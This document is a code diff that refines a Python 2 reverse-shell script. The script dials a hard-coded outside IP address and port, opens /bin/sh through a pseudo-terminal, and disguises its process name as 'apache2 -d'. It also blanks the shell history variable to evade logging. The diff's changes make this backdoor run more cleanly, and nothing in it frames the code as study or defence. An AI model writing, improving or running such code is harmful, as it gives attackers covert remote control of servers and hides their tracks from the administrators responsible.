@@ -3,9 +3,9 @@ import sys, socket, os
 import pty, fcntl, struct, termios, select, resource
 
 pybin = '/usr/bin/python2'    ## path to python on server
-name = 'apache2 -d'           ## fake name for our process (can contain spaces & fake args)
-host = '95.181.93.72'         ## HOST to connect to
-port = 8888                   ## PORT to connect to
+name  = 'apache2 -d'          ## fake name for our process (can contain spaces & fake args)
+host  = '95.181.93.72'        ## HOST to connect to
+port  = 8888                  ## PORT to connect to
 
 
 our_path = os.path.abspath( __file__ )                   ## path to this script
@@ -45,7 +45,8 @@ if not pid: # Child
     except:
         pass
 
-    os.execve( '/bin/sh', [ name ], { 'HISTFILE' : '', 'TERM' : 'linux' } )  ## bash with usefull env vars
+    os.environ.update({ 'HISTFILE':'', 'TERM':'linux' }) ## usefull env vars
+    os.execv( '/bin/sh', [ name ] )                      ## bash with fake name
 
 
 while True:
@@ -57,13 +58,13 @@ while True:
             os.write( fsock, res )
         except:
             print "[!] Die (child time out)......\r"
-            exit( 0 )
+            os._exit( 0 )
 
     if fsock in r:
         res = os.read( fsock, 1000 )
         os.write( fpty, res )
         if not res:
             print "[!] Die (empty socket)....\r"
-            exit( 0 )
+            os._exit( 0 )
 
     os.write( fsock, '\x01' )  ## magic byte (to avoid timeouts)
